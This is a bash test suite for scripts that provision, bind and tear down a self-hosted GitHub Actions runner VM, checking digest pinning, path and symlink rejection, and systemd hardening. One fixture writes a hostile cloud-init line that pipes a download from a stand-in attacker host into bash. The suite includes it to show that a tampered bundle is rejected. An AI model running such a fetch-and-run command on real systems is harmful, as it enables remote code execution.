#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
HOST_PROVISION="${HOST_PROVISION_OVERRIDE:-$REPO_ROOT/deploy/linux/provision-stage-runner-host.sh}"
GUEST_BOOTSTRAP="${GUEST_BOOTSTRAP_OVERRIDE:-$REPO_ROOT/deploy/linux/bootstrap-stage-runner-guest.sh}"
HOST_TEARDOWN="${HOST_TEARDOWN_OVERRIDE:-$REPO_ROOT/deploy/linux/teardown-stage-runner-host.sh}"
BIND_IDENTITY="${BIND_IDENTITY_OVERRIDE:-$REPO_ROOT/deploy/linux/bind-stage-runner-identity.sh}"
DEPLOY_BUNDLE_VALIDATOR="$REPO_ROOT/deploy/linux/validate-deploy-bundle.sh"
UNIT_TEMPLATE="${UNIT_TEMPLATE_OVERRIDE:-$REPO_ROOT/deploy/linux/systemd/disk-arcana-stage-vm.service.in}"
export DISK_ARCANA_STAGE_BUNDLE_VALIDATOR="$DEPLOY_BUNDLE_VALIDATOR"

fail() {
  printf 'FAIL  %s\n' "$*" >&2
  exit 1
}

for required in \
  deploy/linux/provision-stage-runner-host.sh \
  deploy/linux/bootstrap-stage-runner-guest.sh \
  deploy/linux/bind-stage-runner-identity.sh \
  deploy/linux/teardown-stage-runner-host.sh \
  deploy/linux/systemd/disk-arcana-stage-vm.service.in; do
  [[ -f "$REPO_ROOT/$required" ]] || fail "missing $required"
done

printf 'PASS  stage runner provisioning artefacts exist\n'

run_expect() {
  local expected_status="$1" expected_marker="$2" label="$3"
  shift 3
  local output status

  set +e
  output="$("$@" 2>&1)"
  status=$?
  set -e

  if [[ "$status" -ne "$expected_status" ]]; then
    fail "$label status=$status expected=$expected_status output=$output"
  fi
  if [[ "$output" != *"$expected_marker"* ]]; then
    printf 'HARNESS_INVALID  %s missing marker=%s output=%s\n' \
      "$label" "$expected_marker" "$output" >&2
    exit 2
  fi
  printf 'PASS  %s\n' "$label"
}

run_expect 0 'control=positive' 'positive harness control' \
  bash -c 'printf "control=positive\n"'
run_expect 7 'control=negative' 'negative harness control' \
  bash -c 'printf "control=negative\n" >&2; exit 7'

fixture_root="$(mktemp -d)"
cleanup() {
  rm -rf -- "$fixture_root"
}
trap cleanup EXIT

printf 'cloud image\n' >"$fixture_root/cloud.img"
printf 'runner archive\n' >"$fixture_root/runner.tar.gz"
mkdir "$fixture_root/bundle"
printf '#cloud-config\n' >"$fixture_root/bundle/user-data"
printf 'instance-id: disk-arcana-stage-test\nlocal-hostname: disk-arcana-stage\n' \
  >"$fixture_root/bundle/meta-data"
cloud_sha="$(sha256sum "$fixture_root/cloud.img" | awk '{print $1}')"
runner_sha="$(sha256sum "$fixture_root/runner.tar.gz" | awk '{print $1}')"
bundle_sha="$({
  sha256sum "$fixture_root/bundle/user-data" | awk '{print $1 "  user-data"}'
  sha256sum "$fixture_root/bundle/meta-data" | awk '{print $1 "  meta-data"}'
} | sha256sum | awk '{print $1}')"
valid_root="/var/lib/disk-arcana-stage/test-${$}"

base_args=(
  --state-root "$valid_root"
  --cloud-image "$fixture_root/cloud.img"
  --cloud-image-sha256 "$cloud_sha"
  --guest-bundle "$fixture_root/bundle"
  --runner-archive "$fixture_root/runner.tar.gz"
  --runner-archive-sha256 "$runner_sha"
  --management-port 22446
  --guest-bundle-sha256 "$bundle_sha"
  --validate-only
)

run_expect 64 'missing required option: --state-root' \
  'missing state root is rejected' \
  bash "$HOST_PROVISION" --validate-only

invalid_root_args=("${base_args[@]}")
invalid_root_args[1]='relative/state'
run_expect 65 'state root must be absolute' \
  'relative state root is rejected' \
  bash "$HOST_PROVISION" "${invalid_root_args[@]}"

invalid_digest_args=("${base_args[@]}")
invalid_digest_args[5]='not-a-digest'
run_expect 65 'cloud image SHA-256 must be 64 lowercase hex characters' \
  'malformed cloud digest is rejected' \
  bash "$HOST_PROVISION" "${invalid_digest_args[@]}"

mismatch_args=("${base_args[@]}")
mismatch_args[5]="$(printf '0%.0s' {1..64})"
run_expect 66 'cloud image digest mismatch' \
  'wrong cloud digest is rejected before mutation' \
  bash "$HOST_PROVISION" "${mismatch_args[@]}"
[[ ! -e "$valid_root" ]] || fail 'wrong digest created guest state'

runner_mismatch_args=("${base_args[@]}")
runner_mismatch_args[11]="$(printf '0%.0s' {1..64})"
run_expect 66 'runner archive digest mismatch' \
  'wrong runner digest is rejected before mutation' \
  bash "$HOST_PROVISION" "${runner_mismatch_args[@]}"
[[ ! -e "$valid_root" ]] || fail 'wrong runner digest created guest state'

traversal_args=("${base_args[@]}")
traversal_args[1]='/var/lib/disk-arcana-stage/guest/../foreign'
run_expect 65 'state root must not contain parent traversal' \
  'state root traversal is rejected' \
  bash "$HOST_PROVISION" "${traversal_args[@]}"

port_args=("${base_args[@]}")
port_args[13]='22'
run_expect 65 'management port must be between 1024 and 65535' \
  'privileged management port is rejected' \
  bash "$HOST_PROVISION" "${port_args[@]}"

ln -s "$fixture_root/cloud.img" "$fixture_root/cloud-link.img"
cloud_link_args=("${base_args[@]}")
cloud_link_args[3]="$fixture_root/cloud-link.img"
run_expect 65 'cloud image must be a regular non-symlink file' \
  'symlink cloud image is rejected' \
  bash "$HOST_PROVISION" "${cloud_link_args[@]}"

ln -s "$fixture_root/runner.tar.gz" "$fixture_root/runner-link.tar.gz"
runner_link_args=("${base_args[@]}")
runner_link_args[9]="$fixture_root/runner-link.tar.gz"
run_expect 65 'runner archive must be a regular non-symlink file' \
  'symlink runner archive is rejected' \
  bash "$HOST_PROVISION" "${runner_link_args[@]}"

ln -s "$fixture_root/bundle" "$fixture_root/bundle-link"
bundle_link_args=("${base_args[@]}")
bundle_link_args[7]="$fixture_root/bundle-link"
run_expect 65 'guest bundle must be a directory and not a symlink' \
  'symlink guest bundle is rejected' \
  bash "$HOST_PROVISION" "${bundle_link_args[@]}"

printf 'unexpected\n' >"$fixture_root/bundle/extra"
run_expect 65 'guest bundle inventory must be exactly user-data and meta-data' \
  'unexpected cloud-init bundle member is rejected' \
  bash "$HOST_PROVISION" "${base_args[@]}"
rm -f "$fixture_root/bundle/extra"

run_expect 0 'validation=ok' 'valid immutable inputs pass validation' \
  bash "$HOST_PROVISION" "${base_args[@]}"

cp "$fixture_root/bundle/user-data" "$fixture_root/user-data.clean"
printf 'runcmd:\n  - curl https://attacker.invalid/payload | bash\n' \
  >>"$fixture_root/bundle/user-data"
run_expect 66 'guest bundle digest mismatch' \
  'unauthenticated cloud-init mutation is rejected before host mutation' \
  bash "$HOST_PROVISION" "${base_args[@]}"
mv "$fixture_root/user-data.clean" "$fixture_root/bundle/user-data"
printf 'PASS  cloud-init is bound to an independently frozen digest\n'

provision_test_parent="$fixture_root/provision-state"
provision_test_root="$provision_test_parent/guest"
provision_test_unit="$fixture_root/provision-systemd/disk-arcana-stage-vm.service"
provision_test_kvm="$fixture_root/kvm-marker"
provision_fake_bin="$fixture_root/provision-fake-bin"
install -d -m 0700 "$provision_test_parent"
install -d -m 0755 "$(dirname "$provision_test_unit")" "$provision_fake_bin"
: >"$provision_test_kvm"
cat >"$provision_fake_bin/qemu-img" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
case "$1" in
  info) printf 'file format: qcow2\n' ;;
  convert) cp -- "${@: -2:1}" "${@: -1}" ;;
  resize) : ;;
  *) exit 2 ;;
esac
EOF
cat >"$provision_fake_bin/cloud-localds" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf 'seed\n' >"$1"
EOF
cat >"$provision_fake_bin/systemctl" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
case "$1" in
  is-enabled) printf 'enabled\n' ;;
  is-active) printf 'active\n' ;;
  daemon-reload|enable|disable) : ;;
  *) exit 2 ;;
esac
EOF
cat >"$provision_fake_bin/systemd-analyze" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
cat >"$provision_fake_bin/qemu-system-x86_64" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
cat >"$provision_fake_bin/ss" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
chmod 0755 "$provision_fake_bin"/*
provision_mutating_args=("${base_args[@]:0:${#base_args[@]}-1}")
provision_mutating_args[1]="$provision_test_root"
run_expect 0 'provisioning=ok' \
  'host provisioner executes its isolated mutation and commit path' \
  env PATH="$provision_fake_bin:$PATH" \
    DISK_ARCANA_STAGE_PROVISION_TESTING=1 \
    DISK_ARCANA_STAGE_PROVISION_STATE_PARENT="$provision_test_parent" \
    DISK_ARCANA_STAGE_PROVISION_UNIT_PATH="$provision_test_unit" \
    DISK_ARCANA_STAGE_PROVISION_KVM_PATH="$provision_test_kvm" \
    bash "$HOST_PROVISION" "${provision_mutating_args[@]}"
grep -Fx 'phase=COMMITTED' "$provision_test_root/phase" >/dev/null ||
  fail 'host provisioner did not commit durable state'
grep -Fx "guest_bundle_sha256=$bundle_sha" "$provision_test_root/state.manifest" >/dev/null ||
  fail 'host provisioner did not persist the authenticated cloud-init digest'
[[ -f "$provision_test_unit" && "$(stat -c '%a' "$provision_test_unit")" == 644 ]] ||
  fail 'host provisioner did not install the isolated unit'
printf 'PASS  host provisioning mutation path commits authenticated state\n'

unit_template="$UNIT_TEMPLATE"
for required_unit_text in \
  'ExecStart=/usr/bin/qemu-system-x86_64' \
  '-enable-kvm' \
  'file=@STATE_ROOT@/disk.qcow2' \
  'file=@STATE_ROOT@/seed.img' \
  'hostfwd=tcp:127.0.0.1:@MANAGEMENT_PORT@-:22' \
  '-no-reboot' \
  'NoNewPrivileges=yes' \
  'PrivateTmp=yes' \
  'DevicePolicy=closed' \
  'DeviceAllow=/dev/kvm rw' \
  'ProtectSystem=strict' \
  'ReadWritePaths=@STATE_ROOT@'; do
  grep -F -- "$required_unit_text" "$unit_template" >/dev/null ||
    fail "host unit is missing $required_unit_text"
done
if grep -Fx 'PrivateDevices=yes' "$unit_template" >/dev/null; then
  fail 'host unit hides /dev/kvm behind PrivateDevices=yes'
fi
if grep -Ei -- '(docker\.sock|9p|virtfs|filesystem)' "$unit_template" >/dev/null; then
  fail 'host unit exposes a forbidden host filesystem or Docker seam'
fi
printf 'PASS  host unit is KVM-only with loopback management and no host mounts\n'

for directive in StartLimitIntervalSec StartLimitBurst; do
  directive_section="$(
    awk -v wanted="$directive" '
      /^\[[^]]+\]$/ {section=$0}
      $0 ~ "^" wanted "=" {print section}
    ' "$unit_template"
  )"
  [[ "$directive_section" == '[Unit]' ]] ||
    fail "$directive must occur exactly once under [Unit]"
done
printf 'PASS  host VM restart limits are placed under [Unit]\n'

bind_root="$fixture_root/bind/guest"
install -d -m 0700 "$fixture_root/bind"
install -d -m 0700 "$bind_root"
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$bind_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=UNREGISTERED\n'
} >"$bind_root/state.manifest"
chmod 0600 "$bind_root/state.manifest"
printf 'github-api-token-1234567890\n' >"$fixture_root/bind/token"
chmod 0600 "$fixture_root/bind/token"
printf '{"id":987654,"name":"disk-arcana-stage","status":"online","busy":false,"labels":[{"name":"self-hosted"},{"name":"Linux"},{"name":"X64"},{"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/api-response.json"
printf '{"total_count":1,"runners":[{"id":987654,"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/group-api-response.json"
run_expect 0 'validation=ok runner_id=987654 runner_name=disk-arcana-stage' \
  'identity binding validates the exact live runner before mutation' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
grep -Fx 'runner_id=UNREGISTERED' "$bind_root/state.manifest" >/dev/null ||
  fail 'identity validation mutated the unregistered manifest'
printf 'PASS  identity validation leaves the unregistered manifest unchanged\n'
bind_manifest_before="$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')"
printf '{"id":987655,"name":"disk-arcana-stage","status":"online","busy":false,"labels":[{"name":"self-hosted"},{"name":"Linux"},{"name":"X64"},{"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/api-response-wrong-id.json"
run_expect 66 'GitHub runner identity mismatch' \
  'identity binding rejects wrong runner ID before mutation' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response-wrong-id.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
[[ "$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')" == "$bind_manifest_before" ]] ||
  fail 'wrong live runner ID changed the host manifest'
printf 'PASS  identity mismatch leaves the host manifest byte-identical\n'

printf '{"id":987654,"name":"disk-arcana-stage","status":"offline","busy":true,"labels":[{"name":"wrong-label"}]}\n' \
  >"$fixture_root/bind/api-response-unsafe-boundary.json"
printf '{"total_count":1,"runners":[{"id":999,"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/group-api-response-wrong.json"
run_expect 66 'GitHub runner boundary mismatch' \
  'identity binding rejects offline busy wrong-label wrong-group runner' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response-unsafe-boundary.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response-wrong.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
[[ "$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')" == "$bind_manifest_before" ]] ||
  fail 'unsafe runner boundary changed the host manifest'
printf 'PASS  unsafe runner boundary leaves the host manifest byte-identical\n'

printf '{"id":987654,"name":"disk-arcana-stage","status":"online","busy":false,"labels":[{"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/api-response-incomplete-labels.json"
run_expect 66 'GitHub runner boundary mismatch' \
  'identity binding rejects a runner without the exact workflow label set' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response-incomplete-labels.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
[[ "$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')" == "$bind_manifest_before" ]] ||
  fail 'incomplete runner labels changed the host manifest'

printf '{"total_count":2,"runners":[{"id":987654,"name":"disk-arcana-stage"},{"id":999,"name":"foreign-runner"}]}\n' \
  >"$fixture_root/bind/group-api-response-foreign.json"
run_expect 66 'GitHub runner boundary mismatch' \
  'identity binding rejects a group containing a foreign runner' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response-foreign.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
[[ "$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')" == "$bind_manifest_before" ]] ||
  fail 'foreign group membership changed the host manifest'
printf 'PASS  exact labels and singleton group membership are load-bearing\n'

bind_commit_root="$fixture_root/bind-commit/guest"
install -d -m 0700 "$fixture_root/bind-commit" "$bind_commit_root"
sed "s|^state_root=.*|state_root=$bind_commit_root|" \
  "$bind_root/state.manifest" >"$bind_commit_root/state.manifest"
chmod 0600 "$bind_commit_root/state.manifest"
install -m 0600 "$fixture_root/bind/token" "$fixture_root/bind-commit/token"
run_expect 0 'binding=committed runner_id=987654 runner_name=disk-arcana-stage' \
  'identity binding commits only the verified exact runner boundary' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_commit_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind-commit/token"
grep -Fx 'runner_id=987654' "$bind_commit_root/state.manifest" >/dev/null ||
  fail 'verified runner identity was not committed'
printf 'PASS  binding commit path mutates only the protected manifest\n'

bootstrap_root="$fixture_root/bootstrap"
install -d -m 0700 "$bootstrap_root"
install -d -m 0700 "$bootstrap_root/bundle"
printf 'bootstrap server\n' >"$bootstrap_root/bundle/disk-arcana-server"
chmod 0755 "$bootstrap_root/bundle/disk-arcana-server"
install -m 0644 "$REPO_ROOT/deploy/linux/disk-arcana-server.service" \
  "$bootstrap_root/bundle/disk-arcana-server.service"
for executable in deploy-server.sh deploy-server-broker.sh install.sh \
  provision-deploy-broker.sh; do
  install -m 0755 "$REPO_ROOT/deploy/linux/$executable" \
    "$bootstrap_root/bundle/$executable"
done
install -m 0440 "$REPO_ROOT/deploy/linux/disk-arcana-deploy.sudoers" \
  "$bootstrap_root/bundle/disk-arcana-deploy.sudoers"
expected_commit='1111111111111111111111111111111111111111'
printf '%s\n' "$expected_commit" >"$bootstrap_root/bundle/commit"
bash "$DEPLOY_BUNDLE_VALIDATOR" create \
  --root "$bootstrap_root/bundle" --commit "$expected_commit" >/dev/null
install -m 0600 "$fixture_root/runner.tar.gz" "$bootstrap_root/runner.tar.gz"
bootstrap_runner_sha="$(sha256sum "$bootstrap_root/runner.tar.gz" | awk '{print $1}')"
printf '%s  runner.tar.gz\n' "$bootstrap_runner_sha" \
  >"$bootstrap_root/runner.tar.gz.sha256"
chmod 0600 "$bootstrap_root/runner.tar.gz.sha256"
registration_token='registration-token-1234567890'
removal_token='removal-token-123456789012345'
{
  printf 'runner_url=https://github.com/Arcanada-one\n'
  printf 'runner_group=disk-arcana-stage\n'
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_label=disk-arcana-stage\n'
  printf 'authority_run_id=31444643689\n'
  printf 'registration_token=%s\n' "$registration_token"
  printf 'removal_token=%s\n' "$removal_token"
} >"$bootstrap_root/registration.env"
chmod 0600 "$bootstrap_root/registration.env"

guest_base_args=(
  --bootstrap-root "$bootstrap_root"
  --expected-commit "$expected_commit"
  --expected-hostname disk-arcana-stage
  --validate-only
)

run_expect 64 'missing required option: --bootstrap-root' \
  'guest bootstrap requires a protected root' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" --validate-only

run_expect 0 'validation=ok' \
  'guest bootstrap accepts exact protected immutable inputs' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"

registration_arm_line="$(
  grep -nF 'runner_registration_attempted=true' "$GUEST_BOOTSTRAP" | cut -d: -f1 || true
)"
registration_call_line="$(
  grep -nF "runuser -u disk-stage -- \"\$runner_install_root/config.sh\"" "$GUEST_BOOTSTRAP" |
    tail -n 1 | cut -d: -f1
)"
[[ "$registration_arm_line" =~ ^[0-9]+$ && "$registration_call_line" =~ ^[0-9]+$ &&
   "$registration_arm_line" -lt "$registration_call_line" ]] ||
  fail 'runner cleanup is not armed before the registration side effect'
grep -F 'runner_registration_attempted" == true' "$GUEST_BOOTSTRAP" >/dev/null ||
  fail 'runner cleanup does not consume the pre-registration arm'
printf 'PASS  runner cleanup is armed before registration can partially succeed\n'

teardown_root="$fixture_root/teardown/guest"
install -d -m 0700 "$fixture_root/teardown"
install -d -m 0700 "$teardown_root"
runner_id=987654
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=%s\n' "$runner_id"
} >"$teardown_root/state.manifest"
chmod 0600 "$teardown_root/state.manifest"
printf 'github-api-token-1234567890\n' >"$fixture_root/teardown/token"
chmod 0600 "$fixture_root/teardown/token"
printf '{"id":%s,"name":"disk-arcana-stage"}\n' "$runner_id" \
  >"$fixture_root/teardown/api-response.json"

teardown_args=(
  --state-root "$teardown_root"
  --github-token-file "$fixture_root/teardown/token"
  --validate-only
)
run_expect 0 'validation=ok runner_id=987654 runner_name=disk-arcana-stage' \
  'teardown accepts exact manifest and live runner identity' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_RESPONSE="$fixture_root/teardown/api-response.json" \
    bash "$HOST_TEARDOWN" "${teardown_args[@]}"

teardown_before="$(
  find "$fixture_root/teardown" -type f -printf '%P %m ' -exec sha256sum {} \; |
    LC_ALL=C sort | sha256sum | awk '{print $1}'
)"
printf '{"id":987655,"name":"disk-arcana-stage"}\n' \
  >"$fixture_root/teardown/api-response-wrong-id.json"
run_expect 66 'GitHub runner identity mismatch' \
  'teardown rejects wrong runner ID before mutation' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_RESPONSE="$fixture_root/teardown/api-response-wrong-id.json" \
    bash "$HOST_TEARDOWN" "${teardown_args[@]}"
rm -f "$fixture_root/teardown/api-response-wrong-id.json"
teardown_after="$(
  find "$fixture_root/teardown" -type f -printf '%P %m ' -exec sha256sum {} \; |
    LC_ALL=C sort | sha256sum | awk '{print $1}'
)"
[[ "$teardown_before" == "$teardown_after" ]] ||
  fail 'wrong runner ID changed teardown state'
printf 'PASS  teardown identity mismatch leaves protected state byte-identical\n'

teardown_delete_parent="$fixture_root/teardown-delete"
teardown_delete_root="$teardown_delete_parent/guest"
teardown_delete_unit="$teardown_delete_parent/disk-arcana-stage-vm.service"
teardown_delete_diagnostics="$teardown_delete_parent/diagnostics"
teardown_delete_bin="$teardown_delete_parent/bin"
install -d -m 0700 "$teardown_delete_parent" "$teardown_delete_root"
install -d -m 0755 "$teardown_delete_bin"
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_delete_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=%s\n' "$runner_id"
} >"$teardown_delete_root/state.manifest"
chmod 0600 "$teardown_delete_root/state.manifest"
printf 'github-api-token-1234567890\n' >"$teardown_delete_parent/token"
chmod 0600 "$teardown_delete_parent/token"
printf '{"id":%s,"name":"disk-arcana-stage"}\n' "$runner_id" \
  >"$teardown_delete_parent/api-response.json"
printf 'ExecStart=/usr/bin/qemu-system-x86_64 -drive file=%s/disk.qcow2\n' \
  "$teardown_delete_root" >"$teardown_delete_unit"
cat >"$teardown_delete_bin/curl" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
[[ "$*" == *'-X DELETE'* ]]
printf '%s\n' "$*" >>"$DISK_ARCANA_STAGE_TEST_DELETE_LOG"
printf '204'
EOF
chmod 0755 "$teardown_delete_bin/curl"
run_expect 0 'teardown=ok runner_id=987654' \
  'teardown executes the exact runner API deletion path' \
  env PATH="$teardown_delete_bin:$PATH" \
    DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_RESPONSE="$teardown_delete_parent/api-response.json" \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_delete_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_delete_diagnostics" \
    DISK_ARCANA_STAGE_TEST_DELETE_LOG="$teardown_delete_parent/delete.log" \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_delete_root" \
      --github-token-file "$teardown_delete_parent/token"
grep -F "/orgs/Arcanada-one/actions/runners/$runner_id" \
  "$teardown_delete_parent/delete.log" >/dev/null ||
  fail 'teardown did not call the exact runner deletion endpoint'
printf 'PASS  runner API deletion is behaviorally load-bearing\n'

teardown_unregistered_parent="$fixture_root/teardown-unregistered"
teardown_unregistered_root="$teardown_unregistered_parent/guest"
teardown_unregistered_unit="$teardown_unregistered_parent/disk-arcana-stage-vm.service"
teardown_unregistered_diagnostics="$teardown_unregistered_parent/diagnostics"
install -d -m 0700 "$teardown_unregistered_parent" "$teardown_unregistered_root"
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_unregistered_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=UNREGISTERED\n'
} >"$teardown_unregistered_root/state.manifest"
chmod 0600 "$teardown_unregistered_root/state.manifest"
printf 'github-api-token-1234567890\n' >"$teardown_unregistered_parent/token"
chmod 0600 "$teardown_unregistered_parent/token"
printf '{"total_count":0,"runners":[]}\n' \
  >"$teardown_unregistered_parent/group-api-response.json"
printf '{"total_count":0,"runners":[]}\n' \
  >"$teardown_unregistered_parent/org-api-response.json"
printf 'ExecStart=/usr/bin/qemu-system-x86_64 -drive file=%s/disk.qcow2\n' \
  "$teardown_unregistered_root" >"$teardown_unregistered_unit"
printf '{"total_count":1,"runners":[{"id":987654,"name":"disk-arcana-stage"}]}\n' \
  >"$teardown_unregistered_parent/org-api-response-ambiguous.json"
run_expect 66 'GitHub unregistered teardown organization boundary is ambiguous' \
  'unregistered teardown rejects an identically named runner outside group 8' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_GROUP_API_RESPONSE="$teardown_unregistered_parent/group-api-response.json" \
    DISK_ARCANA_STAGE_TEARDOWN_ORG_API_RESPONSE="$teardown_unregistered_parent/org-api-response-ambiguous.json" \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_unregistered_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_unregistered_diagnostics" \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_unregistered_root" \
      --github-token-file "$teardown_unregistered_parent/token"
grep -Fx 'phase=GUEST_STOPPED' "$teardown_unregistered_root/teardown-current" >/dev/null ||
  fail 'ambiguous unregistered teardown did not remain at its safe stopped phase'
[[ -e "$teardown_unregistered_unit" ]] ||
  fail 'ambiguous unregistered teardown removed the host unit'
run_expect 0 'teardown=ok runner_id=UNREGISTERED' \
  'teardown removes a recovered host after exact empty-group readback' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_GROUP_API_RESPONSE="$teardown_unregistered_parent/group-api-response.json" \
    DISK_ARCANA_STAGE_TEARDOWN_ORG_API_RESPONSE="$teardown_unregistered_parent/org-api-response.json" \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_unregistered_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_unregistered_diagnostics" \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_unregistered_root" \
      --github-token-file "$teardown_unregistered_parent/token"
[[ ! -e "$teardown_unregistered_root" && ! -e "$teardown_unregistered_unit" ]] ||
  fail 'unregistered recovered teardown retained live host state'
printf 'PASS  recovered unregistered hosts have an executable teardown path\n'

teardown_unbound_parent="$fixture_root/teardown-unbound-runner"
teardown_unbound_root="$teardown_unbound_parent/guest"
teardown_unbound_unit="$teardown_unbound_parent/disk-arcana-stage-vm.service"
teardown_unbound_diagnostics="$teardown_unbound_parent/diagnostics"
install -d -m 0700 "$teardown_unbound_parent" "$teardown_unbound_root"
sed "s|^state_root=.*|state_root=$teardown_unbound_root|" \
  "$teardown_unregistered_diagnostics"/*-UNREGISTERED/state.manifest \
  >"$teardown_unbound_root/state.manifest"
chmod 0600 "$teardown_unbound_root/state.manifest"
printf 'github-api-token-1234567890\n' >"$teardown_unbound_parent/token"
chmod 0600 "$teardown_unbound_parent/token"
printf '{"total_count":1,"runners":[{"id":987654,"name":"disk-arcana-stage","status":"offline","busy":false,"labels":[{"name":"self-hosted"},{"name":"Linux"},{"name":"X64"},{"name":"disk-arcana-stage"}]}]}\n' \
  >"$teardown_unbound_parent/group-api-response.json"
